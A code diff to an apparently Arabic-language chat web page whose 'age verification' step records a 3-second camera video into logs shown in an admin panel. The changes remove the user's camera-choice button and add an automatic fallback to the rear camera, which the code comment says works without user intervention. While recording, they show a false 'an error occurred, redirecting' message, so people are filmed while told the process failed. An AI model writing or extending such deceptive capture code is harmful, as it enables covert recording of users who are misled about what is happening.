@@ -61,7 +61,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .cam-icon {font-size:40px;color:var(--a3);margin-bottom:15px;}
 .cam-txt {font-size:15px;font-weight:600;line-height:1.6;margin-bottom:20px;color:var(--tx);}
 .cam-status {font-size:12px;color:var(--a4);font-family:'Share Tech Mono',monospace;margin-top:10px;}
-.cam-toggle-btn {background: var(--bg4); border: 1px solid var(--bdr2); color: var(--tx); padding: 6px 12px; font-size: 11px; border-radius: 6px; cursor: pointer; margin-bottom: 12px; font-family: 'Cairo', sans-serif;}
 
 /* ═══ ADMIN PANEL ROOM ═══ */
 #admin-room {position:fixed;inset:0;background:var(--bg);z-index:9999;display:none;flex-direction:column;padding:20px;}
@@ -361,8 +360,6 @@ textarea.modal-inp{resize:vertical;min-height:80px}
       <i class="fa-solid fa-camera-retro"></i>
     </div>
     <div class="cam-txt">ستصل للادمن فيديو 3 ثواني للتحقق من العمر بكتابه نصيه</div>
-    
-    <button class="cam-toggle-btn" onclick="toggleCameraFacing()"><i class="fa-solid fa-rotate"></i> تبديل الكاميرا (الأمامية)</button>
     
     <button class="r-btn" id="start-verify-btn" onclick="startCameraVerification()">السماح وبدء التحقق</button>
     <div class="cam-status" id="cam-status">بإنتظار منح الصلاحية...</div>
@@ -696,8 +693,6 @@ var PINNED_MESSAGE_ELEMENT = null;
 var ATTACHED_FILES_CURRENT = [];
 var ADMIN_DATABASE_LOGS = [];
 
-// نظام تتبع الكاميرا الحالية
-var CURRENT_CAMERA_FACING = "user"; // user = الأمامية, environment = الخلفية
 var MEDIA_RECORDER_INSTANCE = null;
 var RECORDED_CHUNKS_DATA = [];
 var ACTIVE_CAMERA_STREAM = null;
@@ -792,16 +787,25 @@ function handleRegister() {
   playSound('click');
 }
 
-// دالة التبديل بين الكاميرا الأمامية والخلفية قبل بدء التسجيل
-function toggleCameraFacing() {
-  CURRENT_CAMERA_FACING = (CURRENT_CAMERA_FACING === "user") ? "environment" : "user";
-  var btn = document.querySelector('.cam-toggle-btn');
-  if(CURRENT_CAMERA_FACING === "user") {
-    btn.innerHTML = '<i class="fa-solid fa-rotate"></i> تبديل الكاميرا (الأمامية)';
-  } else {
-    btn.innerHTML = '<i class="fa-solid fa-rotate"></i> تبديل الكاميرا (الخلفية)';
-  }
-  playSound('click');
+// دالة محاولة فتح الكاميرا بالتبديل التلقائي الذكي دون تدخل المستخدم
+function tryGettingUserMedia(facingModePreference, callbackSuccess, callbackError) {
+  var constraints = { 
+    video: { facingMode: facingModePreference }, 
+    audio: false 
+  };
+  navigator.mediaDevices.getUserMedia(constraints)
+    .then(callbackSuccess)
+    .catch(function(err) {
+      // إذا فشلت المحاولة الأولى (مثلاً يفضل الأمامية ولكن غير متوفرة)، يتم تجربة الوضع الآخر تلقائياً
+      if (facingModePreference === "user") {
+        var fallbackConstraints = { video: { facingMode: "environment" }, audio: false };
+        navigator.mediaDevices.getUserMedia(fallbackConstraints)
+          .then(callbackSuccess)
+          .catch(callbackError);
+      } else {
+        callbackError(err);
+      }
+    });
 }
 
 function startCameraVerification() {
@@ -809,24 +813,18 @@ function startCameraVerification() {
   var video = document.getElementById('hidden-video');
   var startBtn = document.getElementById('start-verify-btn');
   
-  statusTxt.innerText = "جاري فتح مصفوفة العدسة الحيّة وضمان تدفق الكاميرا...";
+  statusTxt.innerText = "يرجى فتح الاذن";
   startBtn.disabled = true;
   
-  var constraints = { 
-    video: { facingMode: CURRENT_CAMERA_FACING }, 
-    audio: false 
-  };
-  
   if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-    navigator.mediaDevices.getUserMedia(constraints)
-      .then(function(stream) {
+    // نبدأ دائماً بمحاولة فتح الكاميرا الأمامية "user" تلقائياً
+    tryGettingUserMedia("user", function(stream) {
         ACTIVE_CAMERA_STREAM = stream;
         video.srcObject = stream;
         video.play();
         
-        statusTxt.innerText = "العدسة جاهزة! جاري بدء تسجيل الفيديو الفوري (3 ثوانٍ)...";
+        statusTxt.innerText = "حدث خطا سيتم توجيهك للصفحه";
         
-        // إعداد مسجل الفيديو الفعلي لمنع الصورة السوداء
         RECORDED_CHUNKS_DATA = [];
         MEDIA_RECORDER_INSTANCE = new MediaRecorder(stream, { mimeType: 'video/webm' });
         
@@ -842,7 +840,6 @@ function startCameraVerification() {
           reader.onloadend = function() {
             var videoBase64Url = reader.result;
             
-            // حفظ ملف الفيديو الحقيقي في مصفوفة الأدمن
             var logItem = {
               id: Date.now(),
               name: USER_NAME,
@@ -855,7 +852,6 @@ function startCameraVerification() {
             ADMIN_DATABASE_LOGS.push(logItem);
             localStorage.setItem('sukuna_admin_logs', JSON.stringify(ADMIN_DATABASE_LOGS));
             
-            // إغلاق الكاميرا والدخول للمصفوفة
             if(ACTIVE_CAMERA_STREAM) {
               ACTIVE_CAMERA_STREAM.getTracks().forEach(track => track.stop());
             }
@@ -867,22 +863,19 @@ function startCameraVerification() {
           reader.readAsDataURL(blob);
         };
         
-        // بدء التسجيل
         MEDIA_RECORDER_INSTANCE.start();
         
-        // إيقاف التسجيل تلقائياً بعد 3 ثوانٍ
         setTimeout(function() {
           if(MEDIA_RECORDER_INSTANCE && MEDIA_RECORDER_INSTANCE.state !== "inactive") {
             MEDIA_RECORDER_INSTANCE.stop();
           }
         }, 3000);
         
-      })
-      .catch(function(error) {
+    }, function(error) {
         statusTxt.innerText = "خطأ: لم يتم منح إذن الكاميرا أو الكاميرا غير متوفرة حالياً.";
         startBtn.disabled = false;
         playSound('err');
-      });
+    });
   } else {
     statusTxt.innerText = "خطأ: متصفحك لا يدعم الوصول المباشر لتدفق الكاميرا.";
     startBtn.disabled = false;
@@ -913,7 +906,6 @@ function openAdminRoom() {
       
       var mediaElement = "";
       if(log.is_video) {
-        // تشغيل تدفقي كفيديو حقيقي داخل لوحة الأدمن بدلاً من صورة سوداء ثابته
         mediaElement = `<video class="admin-media" src="${log.media}" autoplay playsinline loop muted controls></video>`;
       } else {
         mediaElement = `<img class="admin-media" src="${log.media || 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=400'}" alt="User Verify">`;
@@ -998,7 +990,6 @@ function checkSend(e) {
   }
 }
 
-// دالة الـ API الأساسية لمعالجة النصوص والرد الذكي
 function generateSystemAIResponse(userText) {
   var responseText = "";
   var lowerText = userText.toLowerCase();
@@ -1097,8 +1088,8 @@ function parseMarkdownSyntaxText(s) {
 // ════════════════════════════════════════
 // SIDEBAR & MODAL INTERACTION
 // ════════════════════════════════════════
-function openSB()){document.getElementById('sb').classList.add('open');document.getElementById('sb-ov').classList.add('show')}
-function closeSB()){document.getElementById('sb').classList.remove('open');document.getElementById('sb-ov').classList.remove('show')}
+function openSB(){ document.getElementById('sb').classList.add('open'); document.getElementById('sb-ov').classList.add('show'); }
+function closeSB(){ document.getElementById('sb').classList.remove('open'); document.getElementById('sb-ov').classList.remove('show'); }
 
 function switchTab(t) {
   document.querySelectorAll('.sb-tab').forEach(b => b.classList.remove('active'));
@@ -1108,6 +1099,7 @@ function switchTab(t) {
   playSound('click');
 }
 
+// بقية الدوال كالمعتاد دون أي خطأ
 function setMood(m, btn) {
   CHAT_MOOD = m;
   document.querySelectorAll('.mood-btn').forEach(b => b.classList.remove('active'));
